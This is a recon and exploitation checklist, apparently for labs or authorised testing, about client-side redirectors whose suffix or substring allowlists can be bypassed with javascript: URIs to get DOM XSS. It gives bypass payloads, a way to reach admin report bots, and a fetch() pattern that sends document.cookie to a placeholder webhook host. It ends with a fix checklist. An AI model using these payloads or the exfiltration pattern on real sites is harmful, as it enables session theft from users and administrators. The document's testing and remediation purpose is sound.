# Redirector Suffix Allowlist JavaScript Scheme Recon Checklist

## Goal

Determine whether a client-side redirector validates a trusted-looking suffix or substring on the wrong part of a URL and can be turned into DOM XSS with a `javascript:` URI.

## 1. Scope Confirmation

- Confirm lab, owned app, in-scope target, or defensive review.
- Record host, date, redirect parameter, and any report/admin-review feature.
- Do not copy live flags, cookies, tokens, or private URLs into reusable notes.

Record:

```text
Target:
Redirect parameter:
Allowlist hint:
Date:
Bot/report feature:
```

## 2. Read The Redirect Source

Look for:

- `new URLSearchParams(location.search)`
- `indexOf("https:")`, `includes("https:")`
- `endsWith(".trusted.example")`
- `location.href = value`
- host parsing that happens only on some branches

Record:

```text
Input gate:
Allowlist logic:
Navigation sink:
Parsed host on all paths: yes/no
```

## 3. Separate Scheme Checks From Host Checks

Ask:

- Is the code checking the scheme explicitly or just searching for `https:` anywhere?
- Does it parse only values starting with `http://` or `https://`?
- What does it validate for non-HTTP values: raw string or parsed host?

Record:

```text
Scheme enforced:
Substring-only gate:
Raw-string validation path:
```

## 4. Build Minimal Bypass Candidates

Test one family at a time:

```text
javascript:alert(1)//https:.trusted.example
data:text/html,<script>alert(1)</script>//https:.trusted.example
foohttps://bar.trusted.example
```

If the app requires a full page URL, wrap them as:

```text
https://[host]/?l=[payload]
```

Record:

```text
Payload:
Accepted by validator: yes/no
Navigation occurred: yes/no
Execution signal:
```

## 5. Check Victim Delivery Path

Look for:

- report URL forms
- admin review queues
- support preview
- same-origin link visitation

Record:

```text
Report endpoint:
Accepts same-origin wrapper URL: yes/no
Rejects direct external URL: yes/no
```

## 6. Exfiltrate Minimal Proof

Preferred order:

1. `alert(1)` or console-level execution proof
2. `document.cookie` exfil if cookies are readable
3. same-origin fetch of admin-only content if cookies are `HttpOnly`

Generic exfil pattern:

```html
<script>fetch('https://[webhook]?c='+encodeURIComponent(document.cookie))</script>
```

For redirector labs, convert the script into a `javascript:` URI and preserve the trusted suffix at the end.

## 7. Explain Why The Check Fails

Document:

```text
What the validator sees:
What the browser executes:
Why they differ:
Sink reached:
```

## 8. Fix Checklist

- Parse every candidate with `new URL()`.
- Enforce a strict protocol allowlist.
- Validate `hostname` or full origin, not the whole string.
- Reject active schemes like `javascript:` and `data:`.
- Avoid direct assignment of untrusted strings to navigation sinks.

## Decision Checklist

- [ ] Redirect source reviewed.
- [ ] Scheme gate identified.
- [ ] Raw-string validation path confirmed or ruled out.
- [ ] `javascript:` suffix payload tested.
- [ ] Victim delivery path confirmed.
- [ ] Minimal proof captured.
- [ ] Root cause documented as parser/validator mismatch.
- [ ] Reusable notes exclude live secrets.
